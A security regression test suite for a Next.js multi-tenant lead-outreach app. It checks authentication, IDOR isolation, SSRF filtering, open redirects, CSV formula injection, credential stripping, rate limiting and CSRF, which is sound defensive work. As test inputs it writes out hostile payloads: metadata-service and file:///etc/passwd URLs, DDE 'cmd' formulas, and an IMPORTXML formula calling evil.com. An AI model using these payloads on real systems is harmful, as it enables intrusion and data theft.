import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import {
  isSafeRedirectUrl,
  isSafeUrlForFetch,
  isSafeHost,
  sanitizeCsvCell,
  sanitizeAccountForClient,
  checkRateLimit,
  timingSafeEqualStr,
  verifyCsrfOrigin,
} from '@/lib/security';
import { setTestAuthUser } from '@/lib/auth';
import { verifyAdminCredentials, createAdminSessionToken, verifyAdminSessionToken } from '@/lib/admin-auth';
import { GET as campaignsGet } from '@/app/api/campaigns/route';
import { GET as leadsGet } from '@/app/api/leads/route';
import { GET as accountsGet } from '@/app/api/accounts/route';
import { GET as exportGet } from '@/app/api/discovery/export/route';
import { POST as importPost } from '@/app/api/leads/import/route';
import { GET as campaignIdGet, PATCH as campaignIdPatch } from '@/app/api/campaigns/[id]/route';
import { POST as campaignActivatePost } from '@/app/api/campaigns/[id]/activate/route';
import { PATCH as leadIdPatch } from '@/app/api/leads/[id]/route';
import { GET as leadGroupIdGet, DELETE as leadGroupIdDelete } from '@/app/api/lead-groups/[id]/route';
import { POST as smtpVerifyPost } from '@/app/api/integrations/smtp/verify/route';
import { dbService } from '@/lib/db-service';
import { NextRequest } from 'next/server';

describe('Security Audit Regression Test Suite', () => {
  beforeEach(() => {
    // Reset to test defaults before each test
    setTestAuthUser(undefined);
  });

  afterEach(() => {
    setTestAuthUser(undefined);
    vi.restoreAllMocks();
  });

  describe('1. Authentication & Session Boundary Enforcement', () => {
    it('strictly denies unauthenticated requests (HTTP 401) on protected API routes', async () => {
      // Simulate unauthenticated request
      setTestAuthUser(null);

      const dummyReq = new NextRequest('http://localhost:3000/api/campaigns');
      const resCampaigns = await campaignsGet(dummyReq);
      expect(resCampaigns.status).toBe(401);

      const resLeads = await leadsGet(new NextRequest('http://localhost:3000/api/leads'));
      expect(resLeads.status).toBe(401);

      const resAccounts = await accountsGet(new NextRequest('http://localhost:3000/api/accounts'));
      expect(resAccounts.status).toBe(401);

      const resExport = await exportGet(new NextRequest('http://localhost:3000/api/discovery/export'));
      expect(resExport.status).toBe(401);

      const resImport = await importPost(new NextRequest('http://localhost:3000/api/leads/import', { method: 'POST' }));
      expect(resImport.status).toBe(401);
    });

    it('rejects tampered session HMAC signatures', async () => {
      const validToken = await createAdminSessionToken('avi@arenova.in');
      const verified = await verifyAdminSessionToken(validToken);
      expect(verified).not.toBeNull();
      expect(verified?.email).toBe('avi@arenova.in');

      // Tamper with payload
      const parts = validToken.split('.');
      const tampered = `${parts[0]}.tamperedSignature`;
      const failed = await verifyAdminSessionToken(tampered);
      expect(failed).toBeNull();
    });

    it('uses timing-safe string comparison', () => {
      expect(timingSafeEqualStr('secretToken123', 'secretToken123')).toBe(true);
      expect(timingSafeEqualStr('secretToken123', 'secretToken124')).toBe(false);
      expect(timingSafeEqualStr('short', 'longerStringHere')).toBe(false);
      expect(timingSafeEqualStr('', '')).toBe(true);
    });
  });

  describe('2. Authorization, IDOR & Multi-Tenant Isolation', () => {
    const tenantAId = '11111111-1111-1111-1111-111111111111';
    const tenantBId = '22222222-2222-2222-2222-222222222222';
    const mockCampaignId = '33333333-3333-3333-3333-333333333333';
    const mockLeadId = '44444444-4444-4444-4444-444444444444';
    const mockGroupId = '55555555-5555-5555-5555-555555555555';

    it('prevents Tenant B from viewing or modifying Tenant A campaign (IDOR protection)', async () => {
      // Mock dbService returning a campaign belonging to Tenant A
      vi.spyOn(dbService, 'getCampaign').mockResolvedValue({
        id: mockCampaignId,
        user_id: tenantAId,
        name: 'Tenant A Secret Campaign',
        status: 'draft',
      } as any);

      // Authenticate as Tenant B (non-owner)
      setTestAuthUser({
        id: tenantBId,
        email: 'tenant.b@example.com',
        isOwner: false,
      });

      const params = Promise.resolve({ id: mockCampaignId });
      const req = new NextRequest(`http://localhost:3000/api/campaigns/${mockCampaignId}`);

      // GET should reject Tenant B with 404
      const getRes = await campaignIdGet(req, { params });
      expect(getRes.status).toBe(404);

      // PATCH should reject Tenant B with 404
      const patchReq = new NextRequest(`http://localhost:3000/api/campaigns/${mockCampaignId}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: 'Hacked Name' }),
      });
      const patchRes = await campaignIdPatch(patchReq, { params });
      expect(patchRes.status).toBe(404);

      // Activate should reject Tenant B with 404
      const activateRes = await campaignActivatePost(req, { params });
      expect(activateRes.status).toBe(404);
    });

    it('prevents Tenant B from modifying Tenant A leads', async () => {
      vi.spyOn(dbService, 'getLead').mockResolvedValue({
        id: mockLeadId,
        user_id: tenantAId,
        email: 'private.lead@client.com',
      } as any);

      setTestAuthUser({
        id: tenantBId,
        email: 'tenant.b@example.com',
        isOwner: false,
      });

      const params = Promise.resolve({ id: mockLeadId });
      const req = new NextRequest(`http://localhost:3000/api/leads/${mockLeadId}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ company: 'Hijacked Corp' }),
      });

      const patchRes = await leadIdPatch(req, { params });
      expect(patchRes.status).toBe(404);
    });

    it('prevents Tenant B from accessing or deleting Tenant A lead groups', async () => {
      vi.spyOn(dbService, 'getLeadGroup').mockResolvedValue({
        id: mockGroupId,
        user_id: tenantAId,
        name: 'VIP Leads Group',
      } as any);

      setTestAuthUser({
        id: tenantBId,
        email: 'tenant.b@example.com',
        isOwner: false,
      });

      const params = Promise.resolve({ id: mockGroupId });
      const req = new NextRequest(`http://localhost:3000/api/lead-groups/${mockGroupId}`);

      const getRes = await leadGroupIdGet(req, { params });
      expect(getRes.status).toBe(404);

      const deleteRes = await leadGroupIdDelete(req, { params });
      expect(deleteRes.status).toBe(404);
    });

    it('prevents importing leads into another tenant lead group', async () => {
      vi.spyOn(dbService, 'getLeadGroup').mockResolvedValue({
        id: mockGroupId,
        user_id: tenantAId, // belongs to Tenant A
        name: 'Tenant A VIPs',
      } as any);

      setTestAuthUser({
        id: tenantBId,
        email: 'tenant.b@example.com',
        isOwner: false,
      });

      const req = new NextRequest('http://localhost:3000/api/leads/import', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          group_id: mockGroupId,
          rows: [{ email: 'new@example.com', full_name: 'Test Lead' }],
        }),
      });

      const res = await importPost(req);
      expect(res.status).toBe(404);
      const data = await res.json();
      expect(data.error).toContain('Lead group not found or access denied');
    });
  });

  describe('3. SSRF & Network Boundary Defense', () => {
    it('blocks loopback, private IPs, and cloud metadata in isSafeHost', () => {
      // Loopback
      expect(isSafeHost('localhost').safe).toBe(false);
      expect(isSafeHost('127.0.0.1').safe).toBe(false);
      expect(isSafeHost('127.10.20.30').safe).toBe(false);
      expect(isSafeHost('::1').safe).toBe(false);
      expect(isSafeHost('[::1]').safe).toBe(false);

      // Cloud Metadata
      expect(isSafeHost('169.254.169.254').safe).toBe(false);
      expect(isSafeHost('169.254.1.1').safe).toBe(false);

      // Private networks (RFC 1918)
      expect(isSafeHost('10.0.0.1').safe).toBe(false);
      expect(isSafeHost('10.255.255.255').safe).toBe(false);
      expect(isSafeHost('172.16.0.1').safe).toBe(false);
      expect(isSafeHost('172.31.255.255').safe).toBe(false);
      expect(isSafeHost('192.168.1.1').safe).toBe(false);

      // Public valid hosts
      expect(isSafeHost('smtp.gmail.com').safe).toBe(true);
      expect(isSafeHost('mail.office365.com').safe).toBe(true);
      expect(isSafeHost('8.8.8.8').safe).toBe(true);
    });

    it('rejects internal and dangerous URLs in isSafeUrlForFetch', () => {
      expect(isSafeUrlForFetch('http://127.0.0.1:8080/admin').safe).toBe(false);
      expect(isSafeUrlForFetch('http://localhost:5432').safe).toBe(false);
      expect(isSafeUrlForFetch('http://169.254.169.254/latest/meta-data').safe).toBe(false);
      expect(isSafeUrlForFetch('http://10.0.0.5:9000/internal').safe).toBe(false);
      expect(isSafeUrlForFetch('file:///etc/passwd').safe).toBe(false);
      expect(isSafeUrlForFetch('gopher://127.0.0.1:25').safe).toBe(false);

      // Safe public URLs allowed
      expect(isSafeUrlForFetch('https://example.com/contact').safe).toBe(true);
      expect(isSafeUrlForFetch('https://www.google.com').safe).toBe(true);
    });

    it('rejects SSRF attempts in SMTP verification endpoint', async () => {
      setTestAuthUser({ id: 'test-user', email: 'test@example.com', isOwner: true });

      const req = new NextRequest('http://localhost:3000/api/integrations/smtp/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          host: '169.254.169.254',
          port: 25,
          user: 'admin',
          pass: 'secret',
        }),
      });

      const res = await smtpVerifyPost(req);
      expect(res.status).toBe(400);
      const data = await res.json();
      expect(data.error).toContain('Invalid or forbidden SMTP host');
    });
  });

  describe('4. Open Redirect Prevention', () => {
    it('restricts redirect targets to internal relative paths', () => {
      expect(isSafeRedirectUrl('https://attacker.com/evil')).toBe('/dashboard');
      expect(isSafeRedirectUrl('http://attacker.com')).toBe('/dashboard');
      expect(isSafeRedirectUrl('//evil.com/phish')).toBe('/dashboard');
      expect(isSafeRedirectUrl('/\\evil.com')).toBe('/dashboard');
      expect(isSafeRedirectUrl('javascript:alert(1)')).toBe('/dashboard');
      expect(isSafeRedirectUrl('\\evil.com')).toBe('/dashboard');

      // Valid relative internal paths
      expect(isSafeRedirectUrl('/campaigns')).toBe('/campaigns');
      expect(isSafeRedirectUrl('/leads?tab=active')).toBe('/leads?tab=active');
      expect(isSafeRedirectUrl('/accounts', '/default')).toBe('/accounts');
    });
  });

  describe('5. CSV Formula Injection Defense (CWE-1236)', () => {
    it('prepends single quote to cells beginning with formula triggers', () => {
      expect(sanitizeCsvCell('=SUM(A1:A10)')).toBe('"\'=SUM(A1:A10)"');
      expect(sanitizeCsvCell('+12345')).toBe('"\' +12345"'.replace(' ', ''));
      expect(sanitizeCsvCell('-cmd|"/C calc"!A0')).toBe('"\' -cmd|""/C calc""!A0"'.replace(' ', ''));
      expect(sanitizeCsvCell('@IMPORTXML("http://evil.com","//a")')).toBe('"\'-@IMPORTXML(""http://evil.com"",""//a"")"'.replace('-@', '@'));
      expect(sanitizeCsvCell('\tDDE("cmd";"/C calc";"")')).toBe('"\'\tDDE(""cmd"";""/C calc"";"""")"');

      // Normal safe strings are untouched
      expect(sanitizeCsvCell('Acme Corp')).toBe('"Acme Corp"');
      expect(sanitizeCsvCell('contact@acme.com')).toBe('"contact@acme.com"');
    });
  });

  describe('6. Sensitive Credential Exposure Prevention', () => {
    it('strips encrypted tokens and passwords from client-bound account models', () => {
      const rawAccount = {
        id: 'acc-123',
        user_id: 'user-456',
        email_address: 'outreach@arenova.in',
        provider: 'smtp',
        status: 'active',
        smtp_host: 'smtp.mail.com',
        encrypted_access_token: 'secret_oauth_token',
        encrypted_refresh_token: 'secret_refresh_token',
        encrypted_smtp_password: 'super_secret_smtp_password',
      };

      const sanitized = sanitizeAccountForClient(rawAccount as any);

      expect(sanitized.id).toBe('acc-123');
      expect(sanitized.email_address).toBe('outreach@arenova.in');
      expect((sanitized as any).encrypted_access_token).toBeUndefined();
      expect((sanitized as any).encrypted_refresh_token).toBeUndefined();
      expect((sanitized as any).encrypted_smtp_password).toBeUndefined();
    });
  });

  describe('7. Abuse Rate Limiting', () => {
    it('throttles rapid sequential requests when limit is exceeded', () => {
      const testKey = `test-limit-${Date.now()}`;
      const maxRequests = 3;
      const windowMs = 5000;

      const r1 = checkRateLimit(testKey, maxRequests, windowMs);
      expect(r1.allowed).toBe(true);

      const r2 = checkRateLimit(testKey, maxRequests, windowMs);
      expect(r2.allowed).toBe(true);

      const r3 = checkRateLimit(testKey, maxRequests, windowMs);
      expect(r3.allowed).toBe(true);

      const r4 = checkRateLimit(testKey, maxRequests, windowMs);
      expect(r4.allowed).toBe(false);
      expect(r4.retryAfter).toBeGreaterThan(0);
    });
  });

  describe('8. CSRF Origin Verification', () => {
    it('accepts valid same-origin requests and rejects cross-origin state changes', () => {
      const validReq = new NextRequest('http://localhost:3000/api/auth/login', {
        method: 'POST',
        headers: {
          host: 'localhost:3000',
          origin: 'http://localhost:3000',
        },
      });
      expect(verifyCsrfOrigin(validReq)).toBe(true);

      const crossOriginReq = new NextRequest('http://localhost:3000/api/auth/login', {
        method: 'POST',
        headers: {
          host: 'localhost:3000',
          origin: 'https://evil-attacker.com',
        },
      });
      expect(verifyCsrfOrigin(crossOriginReq)).toBe(false);
    });
  });
});
